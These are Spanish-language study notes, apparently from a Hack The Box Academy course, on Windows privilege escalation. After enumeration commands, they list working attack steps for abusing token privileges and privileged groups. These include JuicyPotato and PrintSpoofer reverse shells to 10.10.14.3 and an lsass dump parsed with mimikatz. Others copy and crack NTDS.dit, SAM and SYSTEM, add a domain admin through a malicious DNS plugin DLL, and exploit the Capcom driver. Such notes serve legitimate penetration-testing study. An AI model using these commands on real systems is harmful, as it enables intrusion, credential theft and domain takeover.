	### Windows PRIVESC
Este file esta creado siguiendo el path y modulo de Linux privilege scalation en la Academy de HTB.
El otro file en este mismo directorio sobre privesc fue creado haciendo maquinas sin un orden en la data como va a tener este.

## Enumeracion de red
ipconfig /all
#Interfaces de red e info DNS
arp -a
#Muestra la tabla arp permitiendonos concer con que host se realizo una conexion hace poco
route print
#Tabla de routeo
netstat -ano
#Es el netstat -nat de linux pero en windows


## Enumeracion de protecciones
Get-MpComputerStatus
#Vrificar estado de windows defender
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
#Listar las reglas de AppLocker (Sirve para whitelistear aplicaciones). El comando nos informa cuales programas estan bloqueados
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
#Prueba la politica de AppLocker a un file en particular

## Enumeracion de sistema
tasklist /svc
#Enumeracion de lista de tareas
set
#Permite ver variables de enotrno asi como tambien el PATH
systeminfo
#Permite enumerar informacion como ultima vez parcheado, system OS, si es vm, etc
wmic qfe
#Muestra los parches de la maquina
Get-HotFix | ft -AutoSize
#Lo mismo que arriba pero en ps
wmic product get name
#Enumerar programas instalados
Get-WmiObject -Class Win32_Product |  select Name, Version
#Lo mismo que arriba pero en ps

## Enumeracion de usuarios
query user
#Permite enumerar si hay otro usuario logueado
net user
#Permite enumerar que otros usuarios se loguearon al sistema
echo %USERNAME%
#Mi usr (whoami)
whoami /priv
#Permite enumerar mis privilegios
whoami /groups
#Permite enumerar los grupos en donde estoy
net localgroup
#Permite enumerar todos los grupos existentes en el sistema
net localgroup <group>
#Permite enumerar info sobre el grupo (ej: miembros)
net accounts
#Politica de passwords

## Enumerar PIPES
pipelist.exe /accepteula
#Permite listar los canalizadores
gci \\.\pipe\
#Lo mismo pero con ps
accesschk.exe /accepteula \\.\Pipe\<pipe encontrado> -v
#Permite enumerar los permisos de ese pipe
accesschk.exe -accepteula -w \pipe\* -v
#Permite enumerar poir PIPES en los que se tenga permisos de escritura

## Privilegios: Usuarios
https://academy.hackthebox.com/module/67/section/624
#Cuadro con privilegios de usuarios y sus funciones

SeImpersonatePrivilege
#Privilegio que permite utilizar los tokens de otros procesos para escalar al admin local que tiene privilegios adicionales. Es un privilegio que se le da a admins
Potato
#Este tipo de abuso del privilegio permite usar el token de un proceso que se ejecuta como administrador para realizar acciones con el mismo
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
#Este script (https://github.com/ohpe/juicy-potato) permite abusarnos del permiso. El comando de arriba nos devuelve una reverse shell como NT/Authority System
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
#JuicyPotato no funciona para Windows Server 2019 y Windows 10 compilación 1809. Este otro script nos permite abusarnos del privilegio

SeDebugPrivilege
#Privilegio que sirve para ejecutar una aplicacion o servicio en particular para no agregar la cuenta al grupo admin.
procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Este script de sysinternals permite dumpear lsass para luego pasarlo a mimikatz
sekurlsa::minidump <file.dmp>
sekurlsa::logonPasswords
#Comandos a ingresar en mimikatz
RCE
#Tambien puede llegar a RCE con este privilegio. Solo se necesita crear un proceso secundario y un PID corriendo como administrador para heredar el token de este proceso principal
https://github.com/decoder-it/psgetsystem
#Script que nos ayuda a abusarnos de esto
winlogon.exe
#Sabemos que se ejecuta como SYSTEM. Podemos buscar su PID para tener un candidato
psgetsys.ps1; ImpersonateFromParentPid -ppid <parentpid> -command c:\Windows\System32\cmd.exe -cmdargs <command arguments>
#Una vez tenemos el PID, se corre el comando

SeTakeOwnershipPrivilege
#Le otorga a los usuarios la capacidad de tomar posesion de objetos de Active Directory, archivos/carpetas NTFS, impresoras, claves de registro, servicios y procesos. Dandole permisos WRITE_OWNER sobre el objeto permitiendole cambiarle el owner
https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
whoami /priv
#Comandos para habilitar el privilegio
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
#En el ejemplo, queremos targuetear un archivo al cual no tenemos acceso llamado cred.txt. Este comando nos brinda mas info sobre este file.
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
#Cambiamos el owner a nosotros
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
#Verificacion de ese cambio
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant <nuestro usr>:F
#En el caso de no poder leerlo, se puede requerir la modificacion de ACL
https://academy.hackthebox.com/module/67/section/642
#Al fnal se encunetra una lista con posibles rutas/files de interes

## Privilegios: Grupos
https://academy.hackthebox.com/module/67/section/624
#Cuadro con grupos defualt y sus funciones

Backup Operators
#Otorga privilegios SeBackup (Permite recorrer cualquier carpeta y enumerar su contenido permitiendonos copiar un file de una carpeta. Ver url abajo) y SeRestore
a) 
https://github.com/giuliano108/SeBackupPrivilege
#Permite abusar de SeBackupPrivilege
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
whoami /priv
#Una vez ejecutado los comandos de arriba, verificamos si esta enable el privilegio
Get-SeBackupPrivilege
#Otra forma de verificacion
Set-SeBackupPrivilege
#Si sigue deshabilitado ejecutar este comando
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
#Una vez con este privilegio (usando de ejemplo un contract.txt file) se puede copia de esta forma y asi nos permitira catearlo sin drama
b) 
NTDS.dit
#Este grupo también permite iniciar sesión localmente en un controlador de dominio (NTDS = La base de datos del directorio activo)
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
#Hacemos una copia del C: y lo exponemos como E: usando diskshadow.exe
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
#Copiamos ntds.dist con Copy-FileSeBackupPrivilege para omitir ACL
b') 
SAM y SYSTEM
#El privilegio también nos permite realizar una copia de seguridad de SAM y SYSTEM para extraer pwd con secretsdump.py
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
b'') 
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
#Usar DSInternals para extraer credenciales de NTDS
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
#Lo mismo pero con secretdump de forma offline
c) 
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
#La utilidad robocopy puede usarse tambien para copiar archivos
robocopy /B E:\Windows\NTDS .\ntds ntds.dit

Event Log Readers
#Este privilegio permite la lectura de los logs de la command line
wevtutil qe Security /rd:true /f:text | Select-String "/user"
#Tool para buscar logs de seguridad
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
#Sintaxis con Get-WinEvent en ps

DnsAdmins
#Miembros de este grupo tienen acceso a la informacion DNS
a)
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
#Creacin de DLL para agregar un usuario al grupo domain admins. Es bueno intentar una reverse o nc
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
#Siendo miembro de DnsAdmin con este comando se carga el dll el cual va se ejecuta al iniciarse de nuevo el servicio DNS y va a estar en HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll 
wmic useraccount where name="usr" get sid
#Buscamos SID de nuestro usuario
sc.exe sdshow DNS
#Se enumeran los permisos sobre dns
sc.exe stop dns
sc.exe start dns
#En caso de poder iniciar y parar el servicion, se hace asi. Una vez realizado, se deberia ejecutar el .dll
net group "Domain Admins" /dom
#Verificar asignacion al grupo
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
#Confirmar que la clave de registro exista y se encuentre el .dll correctamente
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
#En el caso de querer borrar la dll eliminamos especificando el nombre que se mostraba al confirmar (en este caso de ejemplo ServerLevelPluginDll)
b)
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
#Deshabilitar bloqueo de consultas
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
#Agregar registro WAPD con nuestra ip. Las consultas van a ser redirigidas a nuestra maquina permitiendonos ejecutar responder

Print Operators
#Otorga a los miembros el privilegio SeLoadDriverPrivilege que permite agregar, administrar, compartir y eliminar impresoras.
a) Con acceso a GUI
https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp
#Este controlador habilita el privilegio y carga el Capcom.sys que le permite ejecutar shellcode como SYSTEM a cualquier user.
include <windows.h>
include <assert.h>
include <winternl.h>
include <sddl.h>
include <stdio.h>
include "tchar.h"
#Se debe agregar esto al poc. Recordar: En C, antes de cada include va un #
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
#COmpilar el .c con cl.exe
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
#Descargar el controlador en /tmp
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
#Agregar referencia al controlador
EnableSeLoadDriverPrivilege.exe
#Verificar si el privilegio esta habilitado
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
#Verificar que Capcom este en la lista
https://github.com/tandasat/ExploitCapcom
#Exploit para abusar de Capcom
b) Sin acceso GUI
ExploitCapcom.cpp -> línea 292
#En esta linea, antes de compilar el programa, se debe modificar con un revshell command 
c) Automatizar
https://github.com/TarlogicSecurity/EoPLoadDriver/
#Script automatizar el proceso de habilitar el privilegio, crear la clave de registro y ejecutar NTLoadDriver para cargar el controlador
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
#Ejecutar el tool
ExploitCapcom.exe
#Explotar
